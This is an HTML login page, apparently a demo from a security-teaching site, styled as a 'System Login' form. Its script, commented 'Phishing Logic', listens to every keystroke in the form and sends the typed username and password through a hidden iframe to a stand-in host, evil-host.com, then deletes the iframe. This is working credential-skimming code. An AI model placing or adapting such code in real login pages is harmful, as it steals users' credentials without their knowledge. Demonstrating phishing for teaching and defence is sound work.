<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Demo System</title>
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <link rel="stylesheet" href="../../css/style.css">
    <style>
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 40px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            box-shadow: var(--shadow-glow);
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: var(--primary-color);
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
        }

        .form-control {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: 4px;
            font-family: var(--font-mono);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
        }

        .btn-primary {
            width: 100%;
            padding: 12px;
            background: var(--primary-color);
            color: #000;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
        }

        .btn-primary:hover {
            background: #00cc33;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
        }

        .login-footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: var(--text-secondary);
        }

        .login-footer a {
            color: var(--primary-color);
            text-decoration: none;
        }
    </style>
</head>

<body>
    <!-- 导航栏 -->
    <div id="navigation-container"></div>

    <div class="login-container">
        <div class="login-header">
            <h2 data-i18n="demo_login_title">System Login</h2>
        </div>
        <form id="loginform" method="get" action="./admin.html">
            <div class="form-group">
                <label for="inputUsername">Username</label>
                <input type="text" name="user" class="form-control" id="inputUsername" placeholder="Enter username"
                    autocomplete="off">
            </div>
            <div class="form-group">
                <label for="inputPassword">Password</label>
                <input type="password" name="pass" class="form-control" id="inputPassword" placeholder="Enter password">
            </div>
            <button type="submit" class="btn-primary">Access System</button>
        </form>
        <div class="login-footer">
            <p>Authorized Personnel Only</p>
            <a href="#">Forgot Password?</a>
        </div>
    </div>

    <!-- Standardized Footer -->
    <footer class="unified-footer injected-footer">
        <p>
            <span>arr0w1 <span style="margin: 0 4px; opacity: 0.3;">|</span> <a href="https://github.com/1135"
                    target="_blank" class="author-link"
                    style="color: inherit; text-decoration: none; transition: color 0.2s;"
                    onmouseover="this.style.color='var(--primary-color)'"
                    onmouseout="this.style.color='inherit'">1135</a></span>
            <span style="opacity: 0.2;">|</span>
            <span class="footer-donation-icons">
                <a href="https://buymeacoffee.com/wi11x5" target="_blank" title="Buy me a coffee" class="donation-link">
                    <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
                </a>
                <a href="https://ko-fi.com/wi11x5" target="_blank" title="Ko-fi" class="donation-link">
                    <img src="https://storage.ko-fi.com/cdn/cup-border.png" alt="Ko-fi">
                </a>
            </span>
        </p>
    </footer>

    <!-- Floating Buttons -->
    <div id="back-to-top" title="Back to Top">
        <svg viewBox="0 0 24 24">
            <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path>
        </svg>
    </div>

    <script src="../../js/main.js"></script>
    <script>
        // 加载导航栏
        (function () {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '../../navigation.html', false);
            try {
                xhr.send();
                if (xhr.status === 200 || xhr.status === 0) {
                    document.getElementById('navigation-container').innerHTML = xhr.responseText;
                }
            } catch (e) {
                console.error('Failed to load navigation:', e);
            }
        })();

        if (typeof applyLanguage === 'function') {
            applyLanguage(localStorage.getItem('lang') || 'zh');
        }

        // Phishing Logic
        const form1 = document.getElementById('loginform');
        form1.addEventListener('input', get_data_and_send_data);

        function get_data_and_send_data() {
            var user = document.getElementById('inputUsername').value;
            var pass = document.getElementById('inputPassword').value;
            var receiver_url = "https://evil-host.com/i_need_data";

            // Create invisible iframe to exfiltrate data
            var iframe1 = document.createElement("iframe");
            iframe1.style.display = "none";
            iframe1.src = receiver_url + "?user=" + encodeURIComponent(user) + "&pass=" + encodeURIComponent(pass);
            document.body.appendChild(iframe1);

            // Cleanup iframe after a short delay to prevent DOM clutter
            setTimeout(() => {
                iframe1.remove();
            }, 1000);
        }
    </script>
</body>

</html>
